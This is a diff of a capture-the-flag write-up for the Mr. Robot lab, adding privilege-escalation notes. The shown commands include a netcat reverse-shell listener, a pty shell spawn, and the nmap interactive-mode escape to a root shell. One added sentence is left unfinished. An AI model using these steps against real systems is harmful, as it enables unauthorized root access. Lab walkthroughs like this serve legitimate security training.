@@ -66,8 +66,13 @@ nc -lvnp 443
  - We crack the hash to find the password for robot  
  - Now that we have the password we can login to the Mr.Robot and read .txt  
 ### 4. Privilege Escalation (Flag 3)
-
-
+~~~
+ls
+cd home
+cd robot
+ls
+~~~
+- We find the file robot and whent we try to cat our access is denied.
 ~~~
 
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -80,6 +85,10 @@ su robot
 
 which nmap
 nmap --version
+~~~
+- We find nmap on the machine (a hit from the fact that it is a webserver) and review which version is running to find out if there are any known vulnerabilites.
+- We find that they are running 
+~~~
 export TERM=xterm
 nmap --interactive
 !/bin/bash
